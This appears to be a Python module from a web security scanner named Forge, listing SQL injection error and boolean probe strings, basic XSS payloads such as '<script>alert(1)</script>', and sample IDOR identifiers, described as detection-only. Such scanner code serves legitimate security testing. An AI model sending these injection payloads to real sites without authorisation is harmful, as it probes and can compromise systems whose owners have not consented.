"""Central, bounded detection payload collections used by Forge."""

class PayloadCollection:
    # Detection-only SQLi probes; no extraction or time-delay payloads.
    SQLI_ERROR = (
        "'", '"', "')", '\")', "'))", '\"))',
        "1'", '1"', "1)", "1))", "'-- -", '"-- -', "')-- -", '\")-- -',
    )
    SQLI_BOOLEAN_NUM = (
        ("{v} AND 1=1", "{v} AND 1=2"),
        ("{v} OR 1=1", "{v} OR 1=2"),
        ("{v} AND 2=2", "{v} AND 2=3"),
        ("{v} AND 1=1-- -", "{v} AND 1=2-- -"),
        ("{v} OR 1=1-- -", "{v} OR 1=2-- -"),
        ("{v} AND 1=1#", "{v} AND 1=2#"),
    )
    SQLI_BOOLEAN_TEXT = (
        ("{v}' AND '1'='1", "{v}' AND '1'='2"),
        ("{v}' OR '1'='1", "{v}' OR '1'='2"),
        ('{v}" AND "1"="1', '{v}" AND "1"="2'),
        ("{v}' AND 'a'='a'-- -", "{v}' AND 'a'='b'-- -"),
        ("{v}' OR 'a'='a'-- -", "{v}' OR 'a'='b'-- -"),
    )
    XSS = (
        '<script>alert(1)</script>',
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
    )

SQLI_PAYLOADS = PayloadCollection.SQLI_ERROR
XSS_PAYLOADS = PayloadCollection.XSS
IDOR_VALUES = ("1", "2", "999999")
